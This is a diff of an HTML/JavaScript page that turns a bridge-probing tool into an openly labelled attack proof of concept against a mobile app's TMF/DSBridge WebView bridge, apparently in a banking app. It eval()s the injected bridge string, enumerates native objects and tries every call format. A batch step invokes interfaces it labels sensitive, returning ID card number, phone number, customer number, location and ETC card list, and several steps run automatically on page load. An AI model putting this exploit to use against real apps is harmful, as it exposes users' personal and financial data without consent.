@@ -3,269 +3,332 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>TMF Bridge 方法探测</title>
+<title>TMF DSBridge PoC</title>
 <style>
-body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 12px; }
-h2 { color: #ff6b6b; margin-bottom: 8px; }
-pre { background: #161b22; padding: 10px; border-radius: 6px; overflow: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 10px; }
+h3 { color: #e3b341; margin: 10px 0 4px; font-size: 13px; }
+pre { background: #161b22; padding: 8px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; }
 .ok { color: #3fb950; }
-.warn { color: #e3b341; }
 .err { color: #f85149; }
-button { background: #238636; color: white; border: none; padding: 6px 14px; border-radius: 4px; cursor: pointer; margin: 4px 2px; font-size: 11px; }
-button:hover { background: #2ea043; }
-input { background: #161b22; color: #c9d1d9; border: 1px solid #30363d; padding: 4px 8px; border-radius: 4px; width: 100%; margin-bottom: 4px; font-size: 11px; }
-.section { margin-bottom: 16px; }
+.warn { color: #e3b341; }
+button { background: #238636; color: #fff; border: none; padding: 5px 12px; border-radius: 4px; cursor: pointer; margin: 3px 2px; font-size: 11px; }
+input { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 4px 8px; border-radius: 4px; font-size: 11px; width: 100%; margin-bottom: 4px; }
+.section { border: 1px solid #21262d; border-radius: 6px; padding: 8px; margin-bottom: 10px; }
 </style>
 </head>
 <body>
+<h2 style="color:#ff6b6b">🎯 TMF DSBridge 攻击 PoC</h2>
+<p style="color:#8b949e;font-size:10px">DSBridge + TMF_new_h5_bridge 双路径攻击</p>
 
-<h2>🔬 TMF Bridge 方法探测工具</h2>
-
+<!-- Step1: 初始化 DSBridge -->
 <div class="section">
-<h3 class="warn">Step 1: Bridge 对象属性枚举</h3>
-<button onclick="inspectBridge()">枚举所有方法和属性</button>
-<pre id="inspect-out">点击上方按钮开始...</pre>
+<h3>Step 1: 初始化 TMFJSBridge（eval注入字符串）</h3>
+<button onclick="initBridge()">执行初始化</button>
+<pre id="o-init">等待...</pre>
 </div>
 
+<!-- Step2: 枚举 _dsbridge 方法 -->
 <div class="section">
-<h3 class="warn">Step 2: 常用调用方式测试</h3>
-<button onclick="testCallMethods()">自动测试所有可能的调用方式</button>
-<pre id="call-out">等待...</pre>
+<h3>Step 2: 枚举 _dsbridge / TMF_new_h5_bridge 方法</h3>
+<button onclick="inspectNative()">枚举原生对象</button>
+<pre id="o-native">等待...</pre>
 </div>
 
+<!-- Step3: DSBridge 标准调用 -->
 <div class="section">
-<h3 class="warn">Step 3: 手动调用（找到正确方式后）</h3>
-<input id="api-name" value="thirdGetIsLogin" placeholder="API名称">
-<input id="api-params" value="{}" placeholder="参数 JSON">
-<button onclick="manualCall()">调用</button>
-<pre id="manual-out">等待...</pre>
+<h3>Step 3: DSBridge 标准调用（自动尝试所有格式）</h3>
+<button onclick="tryAllFormats()">全格式尝试</button>
+<pre id="o-formats">等待...</pre>
 </div>
 
+<!-- Step4: 手动精确调用 -->
 <div class="section">
-<h3 class="warn">Step 4: 全局对象枚举（找所有 Bridge 相关对象）</h3>
-<button onclick="enumGlobal()">枚举 window 上的 Bridge 对象</button>
-<pre id="global-out">等待...</pre>
+<h3>Step 4: 手动调用</h3>
+<input id="in-api" value="thirdGetIsLogin" placeholder="API名">
+<input id="in-params" value="{}" placeholder="参数">
+<input id="in-ns" value="TMFJSBridge" placeholder="命名空间（可留空）">
+<button onclick="dsCall()">DSBridge 调用</button>
+<button onclick="newBridgeCall()">TMF_new_h5_bridge 调用</button>
+<button onclick="directDsCall()">_dsbridge.call 直接调用</button>
+<pre id="o-manual">等待...</pre>
+</div>
+
+<!-- Step5: 已知敏感接口批量调用 -->
+<div class="section">
+<h3>Step 5: 批量调用敏感接口</h3>
+<button onclick="batchCall()">批量调用</button>
+<pre id="o-batch">等待...</pre>
 </div>
 
 <script>
-function log(id, text, cls) {
+// ─── 工具 ─────────────────────────────────────────────
+var cbMap = {};
+var cbIdx = 0;
+
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function log(id, msg, cls) {
   var el = document.getElementById(id);
-  el.innerHTML += '<span class="' + (cls||'') + '">' + escHtml(text) + '\n</span>';
-}
-function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-
-// Step 1: 枚举 TMFJSBridge 的所有属性和方法
-function inspectBridge() {
-  var el = document.getElementById('inspect-out');
-  el.innerHTML = '';
-  
-  if (!window.TMFJSBridge) {
-    log('inspect-out', '❌ window.TMFJSBridge 不存在！', 'err');
-    return;
-  }
-  
-  log('inspect-out', '✅ window.TMFJSBridge 存在', 'ok');
-  log('inspect-out', 'typeof: ' + typeof window.TMFJSBridge, 'ok');
-  log('inspect-out', '\n--- 所有属性 ---', 'warn');
-  
-  // 枚举所有属性（包括原型链）
-  var props = [];
-  for (var key in window.TMFJSBridge) {
-    props.push(key + ' [' + typeof window.TMFJSBridge[key] + ']');
-  }
-  
-  // 也尝试 Object.getOwnPropertyNames
-  try {
-    var ownProps = Object.getOwnPropertyNames(window.TMFJSBridge);
-    ownProps.forEach(function(k) {
-      var type = typeof window.TMFJSBridge[k];
-      if (props.indexOf(k + ' [' + type + ']') === -1) {
-        props.push(k + ' [' + type + '] (own)');
-      }
-    });
-  } catch(e) {}
-  
-  if (props.length === 0) {
-    log('inspect-out', '(无可枚举属性，尝试原型链...)', 'warn');
-    // 尝试常见方法名
-    var tryMethods = ['call', 'callHandler', 'invoke', 'send', 'postMessage', 
-                      'nativeCall', 'callNative', 'dispatch', 'trigger',
-                      'register', 'registerHandler', 'on', 'emit',
-                      'handleMessageFromNative', '_handleMessageFromNative'];
-    tryMethods.forEach(function(m) {
-      var type = typeof window.TMFJSBridge[m];
-      if (type !== 'undefined') {
-        log('inspect-out', '  ' + m + ': ' + type, 'ok');
-      }
-    });
-  } else {
-    props.forEach(function(p) { log('inspect-out', '  ' + p, 'ok'); });
-  }
-  
-  // 打印 JSON 序列化结果（看看有没有隐藏属性）
-  log('inspect-out', '\n--- JSON.stringify ---', 'warn');
-  try {
-    log('inspect-out', JSON.stringify(window.TMFJSBridge), 'ok');
-  } catch(e) {
-    log('inspect-out', '无法序列化: ' + e.message, 'err');
-  }
-  
-  // 打印 toString
-  log('inspect-out', '\n--- toString ---', 'warn');
-  try {
-    log('inspect-out', String(window.TMFJSBridge), 'ok');
-  } catch(e) {
-    log('inspect-out', e.message, 'err');
-  }
-  
-  // 看 constructor
-  log('inspect-out', '\n--- constructor ---', 'warn');
-  try {
-    log('inspect-out', String(window.TMFJSBridge.constructor), 'ok');
-  } catch(e) {}
+  el.innerHTML += '<span class="'+(cls||'')+'">' + esc(msg) + '\n</span>';
 }
 
-// Step 2: 自动测试所有可能的调用方式
-function testCallMethods() {
-  var el = document.getElementById('call-out');
+// DSBridge 的全局回调机制（_dscbst）
+window._handleMessageFromNative = function(msgStr) {
+  log('o-formats', '[_handleMessageFromNative] ' + msgStr, 'ok');
+  try {
+    var msg = JSON.parse(msgStr);
+    if (msg.id && cbMap[msg.id]) {
+      cbMap[msg.id](msg.data !== undefined ? msg.data : msg);
+      delete cbMap[msg.id];
+    }
+  } catch(e) {}
+};
+
+// DMBridge 标准回调格式
+window._dscbst = window._dscbst || {};
+
+// ─── Step 1: eval 初始化 ───────────────────────────────
+function initBridge() {
+  var el = document.getElementById('o-init');
   el.innerHTML = '';
   
-  if (!window.TMFJSBridge) {
-    log('call-out', '❌ Bridge 不存在', 'err');
-    return;
-  }
-  
-  var testCb = function(result) {
-    log('call-out', '  [回调收到]: ' + JSON.stringify(result), 'ok');
-  };
-  
-  var methods = [
-    // TMF 官方文档可能的格式
-    function() { window.TMFJSBridge.callHandler('thirdGetIsLogin', {}, testCb); return 'callHandler(name, data, cb)'; },
-    function() { window.TMFJSBridge.call('thirdGetIsLogin', '{}', '_cb'); return 'call(name, str, cbName)'; },
-    function() { window.TMFJSBridge.invoke('thirdGetIsLogin', {}, testCb); return 'invoke(name, data, cb)'; },
-    function() { window.TMFJSBridge.send('thirdGetIsLogin', {}, testCb); return 'send(name, data, cb)'; },
-    function() { window.TMFJSBridge.nativeCall('thirdGetIsLogin', '{}', '_cb'); return 'nativeCall(name, str, cbName)'; },
-    // WebViewJavascriptBridge 风格
-    function() { window.TMFJSBridge.handleMessageFromNative(JSON.stringify({handlerName:'thirdGetIsLogin',data:{}})); return 'handleMessageFromNative(json)'; },
-    // 直接调用
-    function() { window.TMFJSBridge('thirdGetIsLogin', {}, testCb); return 'TMFJSBridge(name, data, cb)'; },
-  ];
-  
-  window._cb = testCb; // 全局回调备用
-  
-  methods.forEach(function(fn, i) {
-    var desc = '';
+  if (typeof window.TMFJSBridge === 'string') {
+    log('o-init', 'TMFJSBridge 是字符串，长度: ' + window.TMFJSBridge.length, 'warn');
+    log('o-init', '前200字符: ' + window.TMFJSBridge.substring(0, 200), 'warn');
     try {
-      desc = fn();
-      log('call-out', '[' + i + '] ' + desc + ' → ✅ 无异常', 'ok');
+      eval(window.TMFJSBridge);
+      log('o-init', 'eval() 成功执行！', 'ok');
+      log('o-init', '执行后检查:', 'ok');
+      log('o-init', '  window.dsBridge: ' + typeof window.dsBridge, 'ok');
+      log('o-init', '  window.WebViewJavascriptBridge: ' + typeof window.WebViewJavascriptBridge, 'ok');
+      log('o-init', '  window.TMFBridge: ' + typeof window.TMFBridge, 'ok');
     } catch(e) {
-      log('call-out', '[' + i + '] ' + (desc||'?') + ' → ❌ ' + e.message, 'err');
+      log('o-init', 'eval() 失败: ' + e.message, 'err');
     }
-  });
-  
-  log('call-out', '\n等待 3 秒看是否有回调...', 'warn');
-  setTimeout(function() {
-    log('call-out', '\n3秒后未收到额外回调（如有请看上方）', 'warn');
-  }, 3000);
+  } else {
+    log('o-init', 'TMFJSBridge 不是字符串: ' + typeof window.TMFJSBridge, 'err');
+  }
 }
 
-// Step 3: 手动调用
-function manualCall() {
-  var el = document.getElementById('manual-out');
-  el.innerHTML = '';
-  var apiName = document.getElementById('api-name').value.trim();
-  var paramsStr = document.getElementById('api-params').value.trim();
-  var params = {};
-  try { params = JSON.parse(paramsStr); } catch(e) {}
+// ─── Step 2: 枚举原生对象 ──────────────────────────────
+function inspectNative() {
+  var el = document.getElementById('o-native'); el.innerHTML = '';
   
-  log('manual-out', '调用: ' + apiName + ' params: ' + paramsStr, 'warn');
-  
-  var cbName = '__manualCb_' + Date.now();
-  window[cbName] = function(result) {
-    log('manual-out', '✅ 回调: ' + JSON.stringify(result), 'ok');
-    delete window[cbName];
+  var targets = {
+    '_dsbridge': window._dsbridge,
+    'TMF_new_h5_bridge': window.TMF_new_h5_bridge,
+    'dsBridge': window.dsBridge,
+    'jsbridge': window.jsbridge,
+    'android': window.android,
+    'Android': window.Android,
   };
   
-  // 尝试 callHandler 方式
-  try {
-    window.TMFJSBridge.callHandler(apiName, params, window[cbName]);
-    log('manual-out', '  → callHandler 已发出', 'ok');
-  } catch(e) {
-    log('manual-out', '  → callHandler 失败: ' + e.message, 'err');
-  }
-  
-  setTimeout(function(){
-    if(window[cbName]) {
-      log('manual-out', '  → 6s 超时，无响应', 'err');
-      delete window[cbName];
+  Object.keys(targets).forEach(function(name) {
+    var obj = targets[name];
+    log('o-native', '\n=== ' + name + ' [' + typeof obj + '] ===', 'warn');
+    if (!obj) { log('o-native', '  不存在', 'err'); return; }
+    
+    // 枚举方法
+    var methods = [];
+    for (var k in obj) methods.push(k + '(' + typeof obj[k] + ')');
+    if (methods.length) {
+      log('o-native', '  属性/方法: ' + methods.join(', '), 'ok');
     }
-  }, 6000);
-}
-
-// Step 4: 枚举全局 window 上的 Bridge 相关对象
-function enumGlobal() {
-  var el = document.getElementById('global-out');
-  el.innerHTML = '';
-  
-  var keywords = ['bridge', 'Bridge', 'tmf', 'TMF', 'jsapi', 'JSAPI', 'native', 'Native', 
-                   'webkit', 'android', 'csii', 'bjbank'];
-  var found = [];
-  
-  try {
-    Object.keys(window).forEach(function(key) {
-      if (keywords.some(function(k){ return key.indexOf(k) >= 0; })) {
-        found.push(key + ' [' + typeof window[key] + ']');
+    try {
+      var ownKeys = Object.getOwnPropertyNames(obj);
+      log('o-native', '  OwnPropertyNames: ' + ownKeys.join(', '), 'ok');
+    } catch(e) {}
+    
+    // 测试常见方法
+    ['call','callHandler','invoke','has','list','hasMethod','getRegisteredHandlers'].forEach(function(m) {
+      if (typeof obj[m] === 'function') {
+        log('o-native', '  ✅ .' + m + '() 存在！', 'ok');
       }
     });
-  } catch(e) {
-    // Chrome 限制，用 for...in
-    for (var k in window) {
-      if (keywords.some(function(kw){ return k.indexOf(kw) >= 0; })) {
-        found.push(k + ' [' + typeof window[k] + ']');
-      }
-    }
-  }
-  
-  if (found.length > 0) {
-    log('global-out', '发现以下相关全局对象:', 'ok');
-    found.forEach(function(f) { log('global-out', '  ' + f, 'ok'); });
-  } else {
-    log('global-out', '未发现 Bridge 相关全局对象', 'err');
-  }
-  
-  // 额外检查 webkit messageHandlers
-  log('global-out', '\n--- webkit.messageHandlers ---', 'warn');
-  if (window.webkit && window.webkit.messageHandlers) {
-    log('global-out', '存在 webkit.messageHandlers', 'ok');
-  } else {
-    log('global-out', '不存在（Android 预期）', 'warn');
-  }
-  
-  // 检查 Android 注入的 Java 对象
-  log('global-out', '\n--- Android JavascriptInterface ---', 'warn');
-  ['Android', 'android', 'TMF', 'JsBridge', 'CsiiAndroid'].forEach(function(name) {
-    if (window[name]) {
-      log('global-out', '✅ window.' + name + ' 存在! typeof=' + typeof window[name], 'ok');
-    }
   });
 }
 
-// 页面加载后自动执行环境检测
-window.addEventListener('load', function() {
-  if (window.TMFJSBridge) {
-    log('inspect-out', '✅ TMFJSBridge 已注入，请点击"枚举所有方法"按钮', 'ok');
-    // 自动执行枚举
-    setTimeout(inspectBridge, 500);
-    setTimeout(testCallMethods, 1000);
-    setTimeout(enumGlobal, 1500);
-  } else {
-    document.addEventListener('TMFJSBridgeReady', function() {
-      inspectBridge();
-      setTimeout(testCallMethods, 500);
-      setTimeout(enumGlobal, 1000);
-    }, { once: true });
+// ─── Step 3: 全格式尝试 ────────────────────────────────
+function tryAllFormats() {
+  var el = document.getElementById('o-formats'); el.innerHTML = '';
+  var api = 'thirdGetIsLogin';
+  var params = '{}';
+  
+  function tryIt(desc, fn) {
+    try {
+      var r = fn();
+      log('o-formats', '✅ [' + desc + '] → ' + JSON.stringify(r), 'ok');
+    } catch(e) {
+      log('o-formats', '❌ [' + desc + '] → ' + e.message, 'err');
+    }
   }
+  
+  var cbId = '_poccb_' + (++cbIdx);
+  window[cbId] = function(r) { log('o-formats', '[回调 ' + cbId + '] ' + JSON.stringify(r), 'ok'); };
+  cbMap[cbId] = window[cbId];
+  
+  // ─ DSBridge Android 标准调用 ─
+  // DSBridge 的协议：方法名 + 参数json + "_async_" + callbackId
+  if (window._dsbridge) {
+    tryIt('_dsbridge.call(api, params)', function(){
+      return window._dsbridge.call(api, params);
+    });
+    tryIt('_dsbridge.call(api, params+async+cbId)', function(){
+      return window._dsbridge.call(api, params + '_async_' + cbId);
+    });
+    tryIt('_dsbridge.call(ns.api, params)', function(){
+      return window._dsbridge.call('TMFJSBridge.' + api, params);
+    });
+    tryIt('_dsbridge.call(ns.api, params+async)', function(){
+      return window._dsbridge.call('TMFJSBridge.' + api, params + '_async_' + cbId);
+    });
+    tryIt('_dsbridge.has(api)', function(){
+      return window._dsbridge.has(api);
+    });
+    tryIt('_dsbridge.hasNativeMethod(api, async)', function(){
+      return window._dsbridge.hasNativeMethod('TMFJSBridge.' + api, 'asyn');
+    });
+  }
+  
+  // ─ TMF_new_h5_bridge ─
+  if (window.TMF_new_h5_bridge) {
+    tryIt('TMF_new_h5_bridge.call(api, params, cbId)', function(){
+      return window.TMF_new_h5_bridge.call(api, params, cbId);
+    });
+    tryIt('TMF_new_h5_bridge.postMessage(json)', function(){
+      return window.TMF_new_h5_bridge.postMessage(JSON.stringify({name:api, param:params, cbId:cbId}));
+    });
+    // 枚举 TMF_new_h5_bridge 上的所有方法
+    try {
+      var keys = Object.getOwnPropertyNames(window.TMF_new_h5_bridge);
+      log('o-formats', 'TMF_new_h5_bridge 方法列表: ' + keys.join(', '), 'warn');
+    } catch(e) {}
+  }
+  
+  // ─ 事件触发方式 ─
+  tryIt('document通过prompt(JSON)', function(){
+    return window.prompt('TMFJSBridge://' + api + '?' + params);
+  });
+  
+  log('o-formats', '\n5秒后检查回调...', 'warn');
+  setTimeout(function(){
+    log('o-formats', '5s 结束，查看上方是否有回调', 'warn');
+  }, 5000);
+}
+
+// ─── Step 4: 手动调用 ─────────────────────────────────
+function getManualParams() {
+  return {
+    api: document.getElementById('in-api').value.trim(),
+    params: document.getElementById('in-params').value.trim(),
+    ns: document.getElementById('in-ns').value.trim()
+  };
+}
+
+function receiveResult(prefix, result) {
+  log('o-manual', prefix + JSON.stringify(result), 'ok');
+}
+
+function dsCall() {
+  var p = getManualParams(); var el = document.getElementById('o-manual'); el.innerHTML = '';
+  var cbId = '_mc_' + (++cbIdx);
+  window[cbId] = function(r) { receiveResult('[DSBridge回调] ', r); };
+  
+  if (!window._dsbridge) { log('o-manual', '_dsbridge 不存在', 'err'); return; }
+  
+  // 异步调用（带回调ID）
+  var fullMethod = p.ns ? p.ns + '.' + p.api : p.api;
+  try {
+    var r = window._dsbridge.call(fullMethod, p.params + '_async_' + cbId);
+    log('o-manual', '同步返回: ' + r, 'ok');
+  } catch(e) { log('o-manual', '调用失败: ' + e.message, 'err'); }
+  setTimeout(function(){ if(window[cbId]){ log('o-manual','超时无回调','err'); delete window[cbId];} }, 6000);
+}
+
+function newBridgeCall() {
+  var p = getManualParams(); var el = document.getElementById('o-manual'); el.innerHTML = '';
+  if (!window.TMF_new_h5_bridge) { log('o-manual', 'TMF_new_h5_bridge 不存在', 'err'); return; }
+  var cbId = '_mc_' + (++cbIdx);
+  window[cbId] = function(r) { receiveResult('[TMF_new_h5回调] ', r); };
+  try {
+    // 尝试各种参数格式
+    var methods = Object.getOwnPropertyNames(window.TMF_new_h5_bridge);
+    log('o-manual', 'TMF_new_h5_bridge 方法: ' + methods.join(', '), 'warn');
+    methods.forEach(function(m) {
+      if (typeof window.TMF_new_h5_bridge[m] === 'function') {
+        try {
+          var r = window.TMF_new_h5_bridge[m](p.api, p.params, cbId);
+          log('o-manual', '.' + m + '() 返回: ' + r, 'ok');
+        } catch(e) {
+          log('o-manual', '.' + m + '() 异常: ' + e.message, 'err');
+        }
+      }
+    });
+  } catch(e) { log('o-manual', '错误: ' + e.message, 'err'); }
+}
+
+function directDsCall() {
+  var p = getManualParams(); var el = document.getElementById('o-manual'); el.innerHTML = '';
+  if (!window._dsbridge) { log('o-manual', '_dsbridge 不存在', 'err'); return; }
+  var cbId = '_mc_' + (++cbIdx);
+  window[cbId] = function(r) { receiveResult('[_dsbridge回调] ', r); };
+  
+  // 尝试 DSBridge 的同步和异步格式
+  var variants = [
+    [p.api, p.params],
+    [p.api, p.params + '_async_' + cbId],
+    ['TMFJSBridge.' + p.api, p.params],
+    ['TMFJSBridge.' + p.api, p.params + '_async_' + cbId],
+    [p.api, JSON.stringify({_dscbstId: cbId, args: JSON.parse(p.params || '{}')})],
+  ];
+  variants.forEach(function(v) {
+    try {
+      var r = window._dsbridge.call(v[0], v[1]);
+      log('o-manual', '_dsbridge.call("' + v[0] + '", "' + v[1].substring(0,30) + '...") → ' + r, 'ok');
+    } catch(e) {
+      log('o-manual', '_dsbridge.call("' + v[0] + '") → 异常: ' + e.message, 'err');
+    }
+  });
+  setTimeout(function(){ if(window[cbId]){ log('o-manual','超时无回调','err'); delete window[cbId];} }, 6000);
+}
+
+// ─── Step 5: 批量调用 ─────────────────────────────────
+var SENSITIVE_APIS = [
+  'thirdGetIsLogin', 'thirdGetIsAuthentication',
+  'thirdGetUserPhotoNumber', 'thirdGetUserIdCardNum',
+  'thirdGetUserCif', 'thirdGetMobileInfo',
+  'thirdGetLocation', 'thirdGetAppVersion',
+  'thirdGetRandomNumber', 'thirdGetETCCardListJsapi',
+];
+
+function batchCall() {
+  var el = document.getElementById('o-batch'); el.innerHTML = '';
+  if (!window._dsbridge) { log('o-batch', '_dsbridge 不存在', 'err'); return; }
+  
+  SENSITIVE_APIS.forEach(function(api, i) {
+    setTimeout(function() {
+      var cbId = '_batch_' + i;
+      window[cbId] = function(r) {
+        log('o-batch', '✅ [' + api + '] → ' + JSON.stringify(r).substring(0, 100), 'ok');
+        delete window[cbId];
+      };
+      try {
+        // 尝试各种命名空间 + DSBridge 异步格式
+        window._dsbridge.call('TMFJSBridge.' + api, '{}' + '_async_' + cbId);
+        log('o-batch', '⏳ [' + api + '] 已发送', 'warn');
+      } catch(e) {
+        log('o-batch', '❌ [' + api + '] ' + e.message, 'err');
+        delete window[cbId];
+      }
+      setTimeout(function(){ if(window[cbId]){ log('o-batch','⏰ ['+api+'] 超时','err'); delete window[cbId];} }, 5000);
+    }, i * 500);
+  });
+}
+
+// ─── 自动执行 ─────────────────────────────────────────
+window.addEventListener('load', function() {
+  setTimeout(initBridge, 400);
+  setTimeout(inspectNative, 800);
+  setTimeout(tryAllFormats, 1400);
 });
 </script>
 </body>
